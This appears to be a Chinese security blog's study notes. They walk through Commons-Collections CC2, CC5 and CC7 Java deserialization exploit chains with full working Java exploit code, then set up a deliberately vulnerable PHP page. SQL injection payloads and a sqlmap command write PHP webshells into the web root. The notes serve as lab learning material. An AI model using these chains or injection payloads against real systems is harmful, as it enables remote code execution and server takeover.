<h4 id="CC2分析"><a href="#CC2分析" class="headerlink" title="CC2分析"></a>CC2分析</h4><p>这次CC2和CC4有点像，前面部分差不多，中间用回了<code>InvokerTransformer.transform()</code>，最后也还是用<code>TemplatesImpl</code>加载字节码</p>
<p>主要是从原来的<code>chainTransformer.transfrom()-&gt;InstantiateTransformer.transform()-&gt;TrAXFilter()-&gt;TemplatesImpl.newTransformer()</code>这一段直接替换成用<code>InvokerTransformer.transform()</code>触发<code>TemplatesImpl.newTransformer()</code></p>
<p>画了张图和CC4做对比</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224140643.png" ></p>
<p>那EXP主要就是修改原来的<code>ChainedTransformer</code>，直接用<code>InvokerTransformer</code>结合transform调用反射调用<code>newTransformer()</code>方法</p>
<h4 id="EXP编写"><a href="#EXP编写" class="headerlink" title="EXP编写"></a>EXP编写</h4><p>把原来的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;TemplatesImpl.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>

<p>变成现在的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br></pre></td></tr></table></figure>

<p>最后代码这么写</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="type">byte</span>[] calc = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Demo/CC3/target/classes/com/Calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">    setFieldValue(templates,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;calc&#125;);</span><br><span class="line"></span><br><span class="line">    <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">    <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line">    priorityQueue.add(templates);</span><br><span class="line">    priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">transformingField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">    transformingField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    transformingField.set(transformingComparator, invokerTransformer);</span><br><span class="line"></span><br><span class="line">    serialize(priorityQueue);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>学到后面会发现利用类加载可以不用再写下面这句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setFieldValue(templates,<span class="string">&quot;_tfactory&quot;</span>,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br></pre></td></tr></table></figure>

<p>因为在反序列化的时候readObject会自动给<code>_tfactory</code>赋值，只有直接调用类加载的时候才需给他赋值</p>
<h3 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h3><h4 id="CC5分析"><a href="#CC5分析" class="headerlink" title="CC5分析"></a>CC5分析</h4><p>直接看yso给的链条，后部分和CC1后部分差不多，从<code>LazyMap.get()</code>直到最后，不同的是这次调用<code>LazyMap.get()</code>的是<code>TiedMapEntry.toString()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224144459.png" ></p>
<p>里面调用了<code>getValue()</code>-&gt;<code>map.get()</code>，接上了<code>LazyMap.get()</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224144613.png" ></p>
<p>从toString往前找，作者给出的是<code>BadAttributeValueExpException</code>的readObject</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224144731.png" ></p>
<p>链子大概就是这样，还是很直观的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224145632.png" ></p>
<h4 id="EXP编写-1"><a href="#EXP编写-1" class="headerlink" title="EXP编写"></a>EXP编写</h4><p>前面部分是和CC1一样的，直接拿过来，这个比较简单，直接给出来</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 前面部分都和CC1一样</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decoratedMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decoratedMap,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// new一个BadAttributeValueExpException对象</span></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反射修改BadAttributeValueExpException里面的val，使他指向TiedMapEntry</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.txt&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h3><h4 id="CC7分析"><a href="#CC7分析" class="headerlink" title="CC7分析"></a>CC7分析</h4><p>直接看yso给出的链条，后半部分还是从<code>LazyMap.get()</code>入手，前面部分从前看，这次用到的是<code>hashtable</code>，他的readObject里有一个<code>reconstitutionPut</code>，调用到<code>AbstractMapDecorator.equals</code>-&gt;<code>AbstractMap.equals</code>-&gt;<code>LazyMap.get()</code></p>
<p>流程还是比较直观的，比较难的是要控制里面<code>e.key</code>之类的这些值，后面编写exp的时候再解决</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224195150.png" ></p>
<h4 id="EXP编写-2"><a href="#EXP编写-2" class="headerlink" title="EXP编写"></a>EXP编写</h4><p>前面部分直接搬前面CC1的（要多回顾，不然容易忘了），后面跳过<code>AbstractMapDecorator</code>，尝试直接引入hashtable</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 前面部分都和CC1一样</span></span><br><span class="line">    HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decoratedMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 引入hashtable</span></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(decoratedMap,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    serialize(hashtable);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>按理说这样是没问题的，引入了hashtable，把LazyMap也包了进去，但是没有如愿弹出计算机</p>
<p>尝试打一个断点，发现在hashtable里<code>reconstitutionPut</code>连for循环都没有进</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224195650.png" ></p>
<p>hashtable的触发要满足一些条件，还挺复杂的，先看最终代码再一个一个解释为什么吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;),</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="type">Map</span> <span class="variable">decorateMap1</span> <span class="operator">=</span> LazyMap.decorate(hashMap1, chainedTransformer);</span><br><span class="line">    decorateMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">decorateMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">    decorateMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">    hashtable.put(decorateMap1, <span class="number">1</span>);</span><br><span class="line">    hashtable.put(decorateMap2, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(chainedTransformer, transformers);</span><br><span class="line">    decorateMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">    serialize(hashtable);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h4><p>readObject先创建一个Entry，然后进入for循环读取key，value，顺便调用<code>reconstitutionPut</code></p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224205011.png" ></p>
<p>进入到这个方法后首先通过key计算一个hash值，用这个hash再计算出一个index，这个index是前面readObject里面创建的Entry的索引。</p>
<p>然后判断当前索引处是否有对象，如果有，就进入for循环判断两个对象是否相等，如果没有，通过当前key的hash，以及key,value,和当前数组节点的Entry新建一个Entry挂入当前索引处。</p>
<p>所以我们需要让Entry数组<code>当前索引处的对象哈希</code>&#x3D;<code>将要挂入的对象哈希</code>，这样才能调用<code>e.key.equals</code>从而进入我们的调用链。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224204741.png" ></p>
<ul>
<li>为什么有两个decorateMap，为什么分别给他们的key这么赋值</li>
</ul>
<p><code>reconstitutionPut</code>是被遍历调用，第一次调用的时候<code>tab[index]</code>内容是空的，在方法最下面会给它赋一个值。第二次进入这个方法后它就不是空，此时的变量分别是</p>
<blockquote>
<p>tab[index] -&gt; 在上一轮for被赋值后，可以把它当成decorateMap1<br>e -&gt; decorateMap2<br>而第二次调用reconstitutionPut的时候传入的key value对应decorateMap2的key value</p>
</blockquote>
<p>所以为了判断能够进入<code>e.key.equals(key)</code>，要先使<code>e.hash == hash</code></p>
<blockquote>
<p>decorateMap1.hash -&gt; decorateMap1.key.hashcode()</p>
</blockquote>
<p>也就是<u>decorateMap1</u>和<u>decorateMap2</u>两个的key作hashcode()处理后的值相等才能过判断</p>
<p>这里利用到java的一个小bug，”yy”和”zZ”做hashcode处理后值是一样的</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224213518.png" ></p>
<ul>
<li>为什么put之后要remove操作</li>
</ul>
<p>然后后面<code>HashTable.put()</code>会调用 <code>equals()</code>，调用完 <code>equals()</code>后，decorateMap2会多增加一个yy键，那就不能满足后面的判断了，删了！</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250224214328.png" ></p>
<ul>
<li>为什么要反射修改<code>iTransformers</code>的值</li>
</ul>
<p>这个和之前的链子遇到的很像，put的过程中就会走到后面预期的链子，这个时候不想让他有反应，就先让操作对象里面没有要执行的的命令，先是个常数，后面再改回来</p>
<h4 id="主要参考"><a href="#主要参考" class="headerlink" title="主要参考"></a>主要参考</h4><p><a class="link"   href="https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE" >https://drun1baby.top/2022/06/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8708-CC7%E9%93%BE<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE" >http://myblog.ac.cn/archives/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8Bcommoncollections7%E5%88%A9%E7%94%A8%E9%93%BE<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p><strong>文章中有任何理解不对的地方，非常欢迎师傅指正🙏</strong></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>利用sql注入getshell</title>
    <url>/2025/02/25/%E5%88%A9%E7%94%A8sql%E6%B3%A8%E5%85%A5getshell/</url>
    <content><![CDATA[<p>感觉自己实操还有欠缺，刚好看到别的师傅有这个主题的博客，我也顺着写一篇笔记</p>
<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><p>直接用了之前上课用到的代码，很简单构造出一个有sql注入的环境</p>
<p>mysql用的是<code>5.1.60</code></p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Get查询&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;div style=<span class="string">&quot;margin-top: 70px;color: black;font-size: 23px;text-align: center&quot;</span>&gt;</span><br><span class="line">    &lt;font color=<span class="string">&quot;#FF0000&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;con_database.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from books where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;sql语句执行失败&#x27;</span>.<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysqli_fetch_row</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color = &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span>  <span class="string">&#x27;Book name:&#x27;</span>.<span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Author:&#x27;</span>.<span class="variable">$row</span>[<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;请输入要查询的记录id&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;/font&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>很明显漏洞在这里</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select * from books where id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="Into-outfile写入文件"><a href="#Into-outfile写入文件" class="headerlink" title="Into outfile写入文件"></a>Into outfile写入文件</h4><h5 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h5><ul>
<li>执行<code>INTO OUTFILE</code>操作的用户必须拥有<code>FILE</code>权限，也可以说是必须是root权限</li>
<li>知道当前网站的绝对路径，对应的路径有写入权限</li>
<li><code>PHP</code>的<code>GPC</code>为 off状态；(魔术引号，GET，POST，Cookie)</li>
<li>secure_file_priv 没有具体值</li>
</ul>
<blockquote>
<p>secure_file_priv 的值为null ，表示限制 mysqld 不允许导入|导出<br>secure_file_priv 的值为 &#x2F;tmp&#x2F; ，表示限制 mysqld 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下<br>secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show global variables like &#x27;%secure_file_priv%&#x27;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
</blockquote>
<h5 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h5><p><strong>基于联合查询</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; union select &#x27;&lt;?php phpinfo(); ?&gt;&#x27;,NULL,NULL into outfile &#x27;C:/phpstudy_pro/WWW/1.php&#x27; --+ </span><br></pre></td></tr></table></figure>

<p><strong>非联合查询</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1&#x27; into outfile &#x27;C:/phpstudy_pro/WWW/4.php&#x27; FIELDS TERMINATED BY &#x27;&lt;?php phpinfo();?&gt;&#x27; --+ </span><br></pre></td></tr></table></figure>

<p>空格可以用+号，<code>%0a</code>、<code>%0b</code>、<code>%a0</code> 、 &#x2F;**&#x2F; 注释符等代替</p>
<p><strong>sqlmap</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &#x27;http://192.168.64.145/sql/sql2-2?id=1&#x27; --file-write=/Users/lingtian/downloads/info.php --file-dest=&quot;C:\phpstudy_pro\WWW\3.php&quot;</span><br></pre></td></tr></table></figure>

<h5 id="Outfile和dumpfile的区别"><a href="#Outfile和dumpfile的区别" class="headerlink" title="Outfile和dumpfile的区别"></a>Outfile和dumpfile的区别</h5><p><strong>outfile</strong>:</p>
<blockquote>
<p>1、 支持多行数据同时导出</p>
<p>2、 使用union联合查询时，要保证两侧查询的列数相同</p>
<p>3、 会在换行符制表符后面追加反斜杠</p>
<p>4、会在末尾追加换行</p>
</blockquote>
<p><strong>dumpfile</strong>:</p>
<blockquote>
<p>1、 每次只能导出一行数据</p>
<p>2、 不会在换行符制表符后面追加反斜杠</p>
<p>3、 不会在末尾追加换行</p>
</blockquote>
<p>所以我们可以用dumpfile写入二进制文件，而用outfile写入的二进制文件最终会无法生效（追加的反斜杠会使二进制文件无法生效）</p>
<h4 id="利用日志写入webshell"><a href="#利用日志写入webshell" class="headerlink" title="利用日志写入webshell"></a>利用日志写入webshell</h4><ul>
<li>web文件夹权限宽松，可以接受写入新的东西</li>
<li>最好是windows系统</li>
<li>运行Mysql或Apache的是高权限</li>
</ul>
<p>MySQL 5.0 版本以上会创建日志文件，可以通过修改日志的全局变量来 getshell</p>
